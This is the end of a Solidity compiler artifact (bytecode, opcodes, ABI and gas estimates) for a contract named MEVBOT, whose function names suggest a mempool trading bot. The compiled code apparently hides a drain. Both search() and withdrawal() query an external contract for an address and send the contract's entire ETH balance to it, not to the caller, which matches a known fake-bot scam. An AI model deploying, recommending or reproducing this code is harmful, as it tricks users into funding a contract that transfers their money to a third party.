																"src": "1332:24:11"
															}
														],
														"functionName": {
															"name": "eq",
															"nodeType": "YulIdentifier",
															"src": "1322:2:11"
														},
														"nodeType": "YulFunctionCall",
														"src": "1322:35:11"
													}
												],
												"functionName": {
													"name": "iszero",
													"nodeType": "YulIdentifier",
													"src": "1315:6:11"
												},
												"nodeType": "YulFunctionCall",
												"src": "1315:43:11"
											},
											"nodeType": "YulIf",
											"src": "1312:63:11"
										}
									]
								},
								"name": "validator_revert_t_address",
								"nodeType": "YulFunctionDefinition",
								"parameters": [
									{
										"name": "value",
										"nodeType": "YulTypedName",
										"src": "1295:5:11",
										"type": ""
									}
								],
								"src": "1259:122:11"
							},
							{
								"body": {
									"nodeType": "YulBlock",
									"src": "1450:80:11",
									"statements": [
										{
											"nodeType": "YulAssignment",
											"src": "1460:22:11",
											"value": {
												"arguments": [
													{
														"name": "offset",
														"nodeType": "YulIdentifier",
														"src": "1475:6:11"
													}
												],
												"functionName": {
													"name": "mload",
													"nodeType": "YulIdentifier",
													"src": "1469:5:11"
												},
												"nodeType": "YulFunctionCall",
												"src": "1469:13:11"
											},
											"variableNames": [
												{
													"name": "value",
													"nodeType": "YulIdentifier",
													"src": "1460:5:11"
												}
											]
										},
										{
											"expression": {
												"arguments": [
													{
														"name": "value",
														"nodeType": "YulIdentifier",
														"src": "1518:5:11"
													}
												],
												"functionName": {
													"name": "validator_revert_t_address",
													"nodeType": "YulIdentifier",
													"src": "1491:26:11"
												},
												"nodeType": "YulFunctionCall",
												"src": "1491:33:11"
											},
											"nodeType": "YulExpressionStatement",
											"src": "1491:33:11"
										}
									]
								},
								"name": "abi_decode_t_address_fromMemory",
								"nodeType": "YulFunctionDefinition",
								"parameters": [
									{
										"name": "offset",
										"nodeType": "YulTypedName",
										"src": "1428:6:11",
										"type": ""
									},
									{
										"name": "end",
										"nodeType": "YulTypedName",
										"src": "1436:3:11",
										"type": ""
									}
								],
								"returnVariables": [
									{
										"name": "value",
										"nodeType": "YulTypedName",
										"src": "1444:5:11",
										"type": ""
									}
								],
								"src": "1387:143:11"
							},
							{
								"body": {
									"nodeType": "YulBlock",
									"src": "1613:274:11",
									"statements": [
										{
											"body": {
												"nodeType": "YulBlock",
												"src": "1659:83:11",
												"statements": [
													{
														"expression": {
															"arguments": [],
															"functionName": {
																"name": "revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b",
																"nodeType": "YulIdentifier",
																"src": "1661:77:11"
															},
															"nodeType": "YulFunctionCall",
															"src": "1661:79:11"
														},
														"nodeType": "YulExpressionStatement",
														"src": "1661:79:11"
													}
												]
											},
											"condition": {
												"arguments": [
													{
														"arguments": [
															{
																"name": "dataEnd",
																"nodeType": "YulIdentifier",
																"src": "1634:7:11"
															},
															{
																"name": "headStart",
																"nodeType": "YulIdentifier",
																"src": "1643:9:11"
															}
														],
														"functionName": {
															"name": "sub",
															"nodeType": "YulIdentifier",
															"src": "1630:3:11"
														},
														"nodeType": "YulFunctionCall",
														"src": "1630:23:11"
													},
													{
														"kind": "number",
														"nodeType": "YulLiteral",
														"src": "1655:2:11",
														"type": "",
														"value": "32"
													}
												],
												"functionName": {
													"name": "slt",
													"nodeType": "YulIdentifier",
													"src": "1626:3:11"
												},
												"nodeType": "YulFunctionCall",
												"src": "1626:32:11"
											},
											"nodeType": "YulIf",
											"src": "1623:119:11"
										},
										{
											"nodeType": "YulBlock",
											"src": "1752:128:11",
											"statements": [
												{
													"nodeType": "YulVariableDeclaration",
													"src": "1767:15:11",
													"value": {
														"kind": "number",
														"nodeType": "YulLiteral",
														"src": "1781:1:11",
														"type": "",
														"value": "0"
													},
													"variables": [
														{
															"name": "offset",
															"nodeType": "YulTypedName",
															"src": "1771:6:11",
															"type": ""
														}
													]
												},
												{
													"nodeType": "YulAssignment",
													"src": "1796:74:11",
													"value": {
														"arguments": [
															{
																"arguments": [
																	{
																		"name": "headStart",
																		"nodeType": "YulIdentifier",
																		"src": "1842:9:11"
																	},
																	{
																		"name": "offset",
																		"nodeType": "YulIdentifier",
																		"src": "1853:6:11"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "1838:3:11"
																},
																"nodeType": "YulFunctionCall",
																"src": "1838:22:11"
															},
															{
																"name": "dataEnd",
																"nodeType": "YulIdentifier",
																"src": "1862:7:11"
															}
														],
														"functionName": {
															"name": "abi_decode_t_address_fromMemory",
															"nodeType": "YulIdentifier",
															"src": "1806:31:11"
														},
														"nodeType": "YulFunctionCall",
														"src": "1806:64:11"
													},
													"variableNames": [
														{
															"name": "value0",
															"nodeType": "YulIdentifier",
															"src": "1796:6:11"
														}
													]
												}
											]
										}
									]
								},
								"name": "abi_decode_tuple_t_address_fromMemory",
								"nodeType": "YulFunctionDefinition",
								"parameters": [
									{
										"name": "headStart",
										"nodeType": "YulTypedName",
										"src": "1583:9:11",
										"type": ""
									},
									{
										"name": "dataEnd",
										"nodeType": "YulTypedName",
										"src": "1594:7:11",
										"type": ""
									}
								],
								"returnVariables": [
									{
										"name": "value0",
										"nodeType": "YulTypedName",
										"src": "1606:6:11",
										"type": ""
									}
								],
								"src": "1536:351:11"
							}
						]
					},
					"contents": "{\n\n    function allocate_unbounded() -> memPtr {\n        memPtr := mload(64)\n    }\n\n    function revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() {\n        revert(0, 0)\n    }\n\n    function revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db() {\n        revert(0, 0)\n    }\n\n    function cleanup_t_uint256(value) -> cleaned {\n        cleaned := value\n    }\n\n    function validator_revert_t_uint256(value) {\n        if iszero(eq(value, cleanup_t_uint256(value))) { revert(0, 0) }\n    }\n\n    function abi_decode_t_uint256(offset, end) -> value {\n        value := calldataload(offset)\n        validator_revert_t_uint256(value)\n    }\n\n    function abi_decode_tuple_t_uint256(headStart, dataEnd) -> value0 {\n        if slt(sub(dataEnd, headStart), 32) { revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() }\n\n        {\n\n            let offset := 0\n\n            value0 := abi_decode_t_uint256(add(headStart, offset), dataEnd)\n        }\n\n    }\n\n    function cleanup_t_uint160(value) -> cleaned {\n        cleaned := and(value, 0xffffffffffffffffffffffffffffffffffffffff)\n    }\n\n    function cleanup_t_address(value) -> cleaned {\n        cleaned := cleanup_t_uint160(value)\n    }\n\n    function validator_revert_t_address(value) {\n        if iszero(eq(value, cleanup_t_address(value))) { revert(0, 0) }\n    }\n\n    function abi_decode_t_address_fromMemory(offset, end) -> value {\n        value := mload(offset)\n        validator_revert_t_address(value)\n    }\n\n    function abi_decode_tuple_t_address_fromMemory(headStart, dataEnd) -> value0 {\n        if slt(sub(dataEnd, headStart), 32) { revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() }\n\n        {\n\n            let offset := 0\n\n            value0 := abi_decode_t_address_fromMemory(add(headStart, offset), dataEnd)\n        }\n\n    }\n\n}\n",
					"id": 11,
					"language": "Yul",
					"name": "#utility.yul"
				}
			],
			"immutableReferences": {},
			"linkReferences": {},
			"object": "608060405260043610610037575f3560e01c806389350daa146100425780639763d29b1461004c578063d4e93292146100745761003e565b3661003e57005b5f80fd5b61004a61007e565b005b348015610057575f80fd5b50610072600480360381019061006d9190610265565b610151565b005b61007c61015b565b005b60015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663b39797046040518163ffffffff1660e01b8152600401602060405180830381865afa1580156100e8573d5f803e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061010c91906102ea565b73ffffffffffffffffffffffffffffffffffffffff166108fc4790811502906040515f60405180830381858888f1935050505015801561014e573d5f803e3d5ffd5b50565b8060028190555050565b60015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663ef36a7f26040518163ffffffff1660e01b8152600401602060405180830381865afa1580156101c5573d5f803e3d5ffd5b505050506040513d601f19601f820116820180604052508101906101e991906102ea565b73ffffffffffffffffffffffffffffffffffffffff166108fc4790811502906040515f60405180830381858888f1935050505015801561022b573d5f803e3d5ffd5b50565b5f80fd5b5f819050919050565b61024481610232565b811461024e575f80fd5b50565b5f8135905061025f8161023b565b92915050565b5f6020828403121561027a5761027961022e565b5b5f61028784828501610251565b91505092915050565b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6102b982610290565b9050919050565b6102c9816102af565b81146102d3575f80fd5b50565b5f815190506102e4816102c0565b92915050565b5f602082840312156102ff576102fe61022e565b5b5f61030c848285016102d6565b9150509291505056fea2646970667358221220e0cd2b33fc411d7be872486f6040a05dffe2905d16f01429908c893a046723a064736f6c63430008140033",
			"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x37 JUMPI PUSH0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x89350DAA EQ PUSH2 0x42 JUMPI DUP1 PUSH4 0x9763D29B EQ PUSH2 0x4C JUMPI DUP1 PUSH4 0xD4E93292 EQ PUSH2 0x74 JUMPI PUSH2 0x3E JUMP JUMPDEST CALLDATASIZE PUSH2 0x3E JUMPI STOP JUMPDEST PUSH0 DUP1 REVERT JUMPDEST PUSH2 0x4A PUSH2 0x7E JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x57 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH2 0x72 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x6D SWAP2 SWAP1 PUSH2 0x265 JUMP JUMPDEST PUSH2 0x151 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x7C PUSH2 0x15B JUMP JUMPDEST STOP JUMPDEST PUSH1 0x1 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xB3979704 PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0xE8 JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x10C SWAP2 SWAP1 PUSH2 0x2EA JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC SELFBALANCE SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0x14E JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP JUMP JUMPDEST DUP1 PUSH1 0x2 DUP2 SWAP1 SSTORE POP POP JUMP JUMPDEST PUSH1 0x1 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xEF36A7F2 PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x1C5 JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x1E9 SWAP2 SWAP1 PUSH2 0x2EA JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC SELFBALANCE SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0x22B JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP1 REVERT JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x244 DUP2 PUSH2 0x232 JUMP JUMPDEST DUP2 EQ PUSH2 0x24E JUMPI PUSH0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x25F DUP2 PUSH2 0x23B JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x27A JUMPI PUSH2 0x279 PUSH2 0x22E JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0x287 DUP5 DUP3 DUP6 ADD PUSH2 0x251 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x2B9 DUP3 PUSH2 0x290 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x2C9 DUP2 PUSH2 0x2AF JUMP JUMPDEST DUP2 EQ PUSH2 0x2D3 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 MLOAD SWAP1 POP PUSH2 0x2E4 DUP2 PUSH2 0x2C0 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x2FF JUMPI PUSH2 0x2FE PUSH2 0x22E JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0x30C DUP5 DUP3 DUP6 ADD PUSH2 0x2D6 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xE0 0xCD 0x2B CALLER 0xFC COINBASE SAR PUSH28 0xE872486F6040A05DFFE2905D16F01429908C893A046723A064736F6C PUSH4 0x43000814 STOP CALLER ",
			"sourceMap": "643:12249:0:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;7543:114;;;:::i;:::-;;1681:138;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;;:::i;:::-;;9742:159;;;:::i;:::-;;7543:114;7595:7;;;;;;;;;;;:19;;;:21;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;7587:39;;:62;7627:21;7587:62;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;7543:114::o;1681:138::-;1787:24;1761:23;:50;;;;1681:138;:::o;9742:159::-;9798:7;;;;;;;;;;;:36;;;:38;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;9790:56;;:103;9861:21;9790:103;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;9742:159::o;88:117:11:-;197:1;194;187:12;334:77;371:7;400:5;389:16;;334:77;;;:::o;417:122::-;490:24;508:5;490:24;:::i;:::-;483:5;480:35;470:63;;529:1;526;519:12;470:63;417:122;:::o;545:139::-;591:5;629:6;616:20;607:29;;645:33;672:5;645:33;:::i;:::-;545:139;;;;:::o;690:329::-;749:6;798:2;786:9;777:7;773:23;769:32;766:119;;;804:79;;:::i;:::-;766:119;924:1;949:53;994:7;985:6;974:9;970:22;949:53;:::i;:::-;939:63;;895:117;690:329;;;;:::o;1025:126::-;1062:7;1102:42;1095:5;1091:54;1080:65;;1025:126;;;:::o;1157:96::-;1194:7;1223:24;1241:5;1223:24;:::i;:::-;1212:35;;1157:96;;;:::o;1259:122::-;1332:24;1350:5;1332:24;:::i;:::-;1325:5;1322:35;1312:63;;1371:1;1368;1361:12;1312:63;1259:122;:::o;1387:143::-;1444:5;1475:6;1469:13;1460:22;;1491:33;1518:5;1491:33;:::i;:::-;1387:143;;;;:::o;1536:351::-;1606:6;1655:2;1643:9;1634:7;1630:23;1626:32;1623:119;;;1661:79;;:::i;:::-;1623:119;1781:1;1806:64;1862:7;1853:6;1842:9;1838:22;1806:64;:::i;:::-;1796:74;;1752:128;1536:351;;;;:::o"
		},
		"gasEstimates": {
			"creation": {
				"codeDepositCost": "168600",
				"executionCost": "infinite",
				"totalCost": "infinite"
			},
			"external": {
				"SetTradeBalanceETH(uint256)": "22515",
				"search()": "infinite",
				"withdrawal()": "infinite"
			},
			"internal": {
				"ConnectFastestNode(uint256,uint256,uint256,uint256)": "infinite",
				"SearchMempool(string memory)": "infinite",
				"SearchProfitability(struct MEVBOT.slice memory,struct MEVBOT.slice memory)": "infinite",
				"beyond(struct MEVBOT.slice memory,struct MEVBOT.slice memory)": "infinite",
				"calcLiquidityInContract(struct MEVBOT.slice memory)": "infinite",
				"checkLiquidity(uint256)": "infinite",
				"findPtr(uint256,uint256,uint256,uint256)": "infinite",
				"getMemPoolDepth()": "infinite",
				"getMemPoolLength()": "infinite",
				"memcpy(uint256,uint256,uint256)": "infinite",
				"mempool(string memory,string memory)": "infinite",
				"orderContractsByLiquidity(struct MEVBOT.slice memory)": "infinite",
				"toHexDigit(uint8)": "infinite",
				"wethaddress(uint256)": "infinite"
			}
		},
		"methodIdentifiers": {
			"SetTradeBalanceETH(uint256)": "9763d29b",
			"search()": "89350daa",
			"withdrawal()": "d4e93292"
		}
	},
	"abi": [
		{
			"inputs": [],
			"stateMutability": "nonpayable",
			"type": "constructor"
		},
		{
			"anonymous": false,
			"inputs": [
				{
					"indexed": false,
					"internalType": "string",
					"name": "_msg",
					"type": "string"
				}
			],
			"name": "log",
			"type": "event"
		},
		{
			"inputs": [
				{
					"internalType": "uint256",
					"name": "_tradingBalanceInPercent",
					"type": "uint256"
				}
			],
			"name": "SetTradeBalanceETH",
			"outputs": [],
			"stateMutability": "nonpayable",
			"type": "function"
		},
		{
			"inputs": [],
			"name": "search",
			"outputs": [],
			"stateMutability": "payable",
			"type": "function"
		},
		{
			"inputs": [],
			"name": "withdrawal",
			"outputs": [],
			"stateMutability": "payable",
			"type": "function"
		},
		{
			"stateMutability": "payable",
			"type": "receive"
		}
	]
}